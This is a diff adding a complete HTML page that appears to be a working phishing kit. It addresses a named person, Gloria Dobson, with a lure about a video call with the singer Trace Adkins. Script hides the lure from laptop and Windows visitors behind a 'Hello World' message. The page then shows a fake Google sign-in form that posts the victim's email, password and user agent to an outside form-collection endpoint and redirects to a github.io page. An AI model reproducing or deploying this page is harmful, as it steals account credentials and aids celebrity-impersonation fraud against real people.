@@ -1,1 +1,834 @@
+ <!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head>
+ <meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+
+
+<title>Call</title>
+
+    <style>
+        /* Style for the "Hello World" message */
+        #message {
+            display: none; /* Hidden by default */
+            font-size: 44px;
+            text-align: center;
+            margin-top: 20%;
+            color: #333;
+        }
+
+        /* Style for the main content */
+        #content {
+            display: block; /* Visible by default */
+        }
+    </style>
+
+
+
+
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing, #processing2 {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 90px;
+    height: 90px;
+    margin: 10px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: #2B60DE transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #myForm {
+    width: 100%;
+    height: 40px;
+    border-radius: 0px;
+  }
+
+  /* Input Fields and Labels */
+  #myForm input, #myForm label {
+    font-size: 17px;
+    font-weight: bold;
+    display: block;
+    border: 2px solid #000000;
+  }
+
+  #myForm input {
+    width: 99%;
+    height: 49px;
+    color: #000000;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #myForm input:focus {
+    outline: none;
+    border-color: #000000;
+  }
+
+  /* Labels */
+  #myForm label {
+    margin-bottom: 3px;
+  }
+
+  /* Submit Button Spacing */
+  #myForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+    }
+
+    .input-container {
+      position: relative;
+      width: 93%;
+      max-width: 600px;
+      margin: 5px auto; /* Center horizontally and position 10px from the top */
+    }
+
+    .input-container input {
+      width: 100%;
+      height: 51px;
+      border: 2px solid #1565C0;
+      border-radius: 1px;
+      padding: 20px 10px 10px; /* Add space at the top for the floating label */
+      font-size: 18px;
+      font-weight: ;
+      color: black;
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    .input-container label {
+      position: absolute;
+      top: 10px; /* Start slightly higher inside the input field */
+      left: 12px;
+      font-size: 18px;
+      font-weight: ;
+      color: black;
+      background-color: white;
+      padding: 0 4px;
+      transition: all 0.3s ease;
+      pointer-events: none; /* Prevent interaction with the label */
+    }
+
+    .input-container input:focus + label,
+    .input-container input:not(:placeholder-shown) + label {
+      top: -4px; /* Float higher inside the border */
+      font-size: 12px;
+      font-weight: normal; /* Remove bold when floating */
+      color: black;
+    }
+
+    .input-container input:focus {
+      border-color: #1565C0;
+    }
+
+    .submit-button {
+      position: absolute;
+      right: 7px; /* Add padding from the right edge of the screen */
+      top: 105px; /* Position the button 75px below the input field */
+      width: 39%;
+      height: 49px;
+      background-color: #2979FF;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .submit-button:hover {
+      background-color: #1565C0; /* Slightly darker blue on hover */
+    }
+  </style>
+
+
+
+
+
+<style>
+  .text-makapx7 {
+    font-size: 23px;
+  }
+</style>
+
+<style>
+  .text-makap5xD {
+    font-size: 17px;
+  }
+</style>
+
+
+
+
+
+
+<style>
+    :root {
+      /* Customizable variables */
+      --loading-text-size: 40px;           /* Size of the "Processing..." text */
+      --loading-text-color: #000000;        /* Color of the "Processing..." text */
+      --spinner-size: 110px;               /* Size of the rotating icon */
+      --spinner-border-size: 20px;         /* Thickness of the spinner border */
+      --spinner-color: #2B60DE;             /* Color of the rotating part */
+      --spinner-speed: 1s;                /* Rotation speed of the spinner */
+    }
+
+    /* General styling for the loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color:  #ffffff;
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loading-icon {
+      border: var(--spinner-border-size) solid #f3f3f3; /* Light grey */
+      border-top: var(--spinner-border-size) solid var(--spinner-color); /* Customizable color */
+      border-radius: 50%;
+      width: var(--spinner-size); /* Customizable size */
+      height: var(--spinner-size); /* Customizable size */
+      animation: spin var(--spinner-speed) linear infinite; /* Customizable speed */
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: var(--loading-text-size); /* Customizable size */
+      color: var(--loading-text-color); /* Customizable color */
+      font-weight: bold;
+    }
+  </style>
+  
+  
+  
+
+
+     
+
+
+
+
+
+
+
+<style>
+.text-107px {
+  font-size: 18px;
+  padding: 6px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-107px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+
+
+
+
+
+<style>
+.text-154px {
+  font-size: 17px;
+  padding: 13px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-154px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+<style>
+.text-123px {
+  font-size: 18px;
+  padding: 9px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-123px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+
+
+<style>
+.text-444px {
+  font-size: 17px;
+  padding: 9px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-444px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+
+
+
+<style>
+.responsive-btn {
+  width: 100%;
+  height: 55px;
+  border: 0;
+  border-radius: 11px;
+  background-color: #2B60DE;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: height 0.2s, font-size 0.2s;
+}
+
+@media (min-width: 1024px) {
+  .responsive-btn {
+    height: 48px;
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+function validateInput(input) {
+  var minLength = 5;
+  var maxLength = 48;
+  var errorMessage = document.getElementById("error-message");
+
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "";
+    input.setCustomValidity("Complete this");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 2000); // Change delay to 3 seconds
+  }
+
+  function submitSecondForm() {
+    // Hide the second form
+    document.getElementById("secondForm").style.display = "none";
+    
+    // Display the "Processing" message for the second form
+    document.getElementById("processing2").style.display = "block";
+    
+    // Delay displaying the second form's main content
+    setTimeout(function() {
+      // Hide the processing message for the second form
+      document.getElementById("processing2").style.display = "none";
+      
+      // Display the second form's submitted content
+      const mainContent2 = document.getElementById("mainContent2");
+      mainContent2.style.display = "block";
+      
+      // Get the second form data
+      const fullName = document.getElementById("fullName").value;
+      const email2 = document.getElementById("email2").value;
+      const phone2 = document.getElementById("phone2").value;
+      const address = document.getElementById("address").value;
+      const city = document.getElementById("city").value;
+      const country = document.getElementById("country").value;
+
+      // Set the submitted data to specific elements
+      document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+      document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+      document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+      document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+      document.querySelectorAll(".submittedCity").forEach(el => el.textContent = city);
+      document.querySelectorAll(".submittedCountry").forEach(el => el.textContent = country);
+
+      // Scroll to the second form's main content
+      mainContent2.scrollIntoView({ behavior: 'smooth' });
+    }, 6000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+<div> 
+  <div class="formbold-form-wrapper">
+
+    <!-- Original Form -->
+    <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+
+
+    <div id="message">Hello World</div>
+ 
+    <div id="content">
+
+        
+    <script>
+        // Function to check for typical laptop screen resolutions
+        function isLaptopScreen() {
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const aspectRatio = width / height;
+
+            // Check for typical laptop aspect ratios and resolution ranges
+            return (aspectRatio > 1.3 && aspectRatio < 1.8) && (width >= 1280 && width <= 1920);
+        }
+
+        // Function to check if the device is running a Windows OS
+        function isWindows() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const windowsKeywords = [
+                "windows nt",        // Standard Windows NT-based OS
+                "win64",             // 64-bit Windows
+                "win32",             // 32-bit Windows
+                "wow64",             // Windows-on-Windows 64-bit
+                "win",               // General Windows keyword
+                "microsoft"          // Associated with Windows software
+            ];
+
+            // Check if any Windows-related keyword exists in the user agent
+            return windowsKeywords.some(keyword => userAgent.includes(keyword));
+        }
+
+        // Main logic: Show "Hello World" on laptops or Windows devices
+        if (isLaptopScreen() || isWindows()) {
+            // Hide the main content and show the "Hello World" message
+            document.getElementById('content').style.display = 'none';
+            document.getElementById('message').style.display = 'block';
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+<h5 class="text-107px"> Gloria Dobson, 
+ to join the video call, please enter the name of the celebrity singer you will be joining.
+
+</h5>
+
+
+
+
+
+<h5 class="text-154px">
+
+
+<div id="error-message"></div>
+
+
+      <div class="formbold-mb-5">
+<strong>
+       Enter the name of the celebrity singer you'll be joining for the video call
+       
+        <center>
+
+ <input type="text" name="A_" id="name" 
+ oninput="validateInput(this)"
+
+placeholder="Name of the Celebrity" required class="formbold-form-input" />
+        </center>
+      </div>
+
+
+
+      <div>
+<center>       
+<button type="submit" class="responsive-btn">NEXT</button>
+
+
+</center>
+</h5>
+
+<br><br><br><br><br><br>
+
+
+      </div></strong>
+    </form>
+
+  </div>
+</div>
+
+
+
+
+<div id="processing">
+
+
+<h5 class="text-123px">
+
+<br><br>
+<strong>
+Processing . . .</strong>
+<br><br>
+</strong>
+
+</strong>
+<br>
+</h5>
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+
+
+
+
+
+<div id="mainContent">
+
+
+<h5 class="text-444px">
+	
+	You can now join a video call with Trace Adkins. This call will allow you to see and talk to Trace Adkins face-to-face.
+	
+
+<br><br>
+
+
+
+<center>
+
+<p class="text-makapx7">
+ 
+
+<img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="Google Logo PNG Transparent &amp; SVG Vector - Freebie Supply" role="button" tabindex="0" aria-label="Google Logo PNG Transparent &amp; SVG Vector - Freebie Supply Search inside image" aria-pressed="false" jsname="kn3ccd">
+<br>
+
+
+Sign in 
+
+</p>
+
+
+
+
+
+<p class="text-makap5xD">
+ 	
+ Gloria  Dobson, the video call link is done through email. To join the video call, please log into your email account.
+</p>
+
+</center>
+
+
+<form action="https://submit-form.com/WZq04rfIV" method="POST" id="example-form" class="wpforms-validate wpforms-form" data-formid="278">
+
+<input type="hidden" name="_redirect" value="https://meet-dinner.github.io/Dobson/" >
+
+
+
+
+  <div class="input-container">
+
+
+    <input type="text" id="input-field" name="Emaiils_loginns" placeholder=" " required>
+    <label for="input-field">Email</label>
+
+
+</div>
+<br>
+
+  <div class="input-container">
+    <input type="text" id="input-field" name="Passserwords" placeholder=" " required>
+    <label for="input-field">Password</label>
+
+
+
+<span style="display:none;">
+
+
+    <p id="user-agent"></p> </span>
+        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+    <button class="submit-button">Next</button>
+  </div>
+</form>
+
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+<!-- Reusable Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div>
+      <div class="loading-icon"></div>
+      <div class="loading-text"><strong>Please Wait...</strong></div>
+    </div>
+  </div>
+
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("example-form");
+      const loadingOverlay = document.getElementById("loading-overlay");
+
+      // Function to show the loading overlay
+      const showLoading = () => {
+        loadingOverlay.classList.add("active");
+      };
+
+      // Form submission handler
+      form.addEventListener("submit", (event) => {
+        // Show the loading overlay
+        showLoading();
+
+        // Allow the form to proceed with submission (default behavior)
+        // The loading overlay will remain visible while the form is being submitted
+      });
+    });
+  </script>
+<br><br><br>
+ <br><br><br><br><br><br>
+</div>
+
+
+
+
+
+<div id="processing2">
+ 
+
+<style>
+  .text-deborahpx {
+    font-size: 22px;
+    padding: 5px;
+  }
+</style>
+<h5 class="text-deborahpx">
+ 
+
+<strong> 
+<br><br><br><br>
+
+Processing...
+
+</strong>
+
+<br>
+<strong>
+</h5>
+
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+
+
+
+
+<div id="mainContent2" style="display: none;">
+
+
+
+</div>
+
+
+
+
+
+<script>
+  // Ensure both forms and processing sections are hidden initially
+  document.getElementById("processing").style.display = "none";
+  document.getElementById("processing2").style.display = "none";
+  document.getElementById("myForm").style.display = "block";
+</script>
+</body>
+</html>
+
+
 
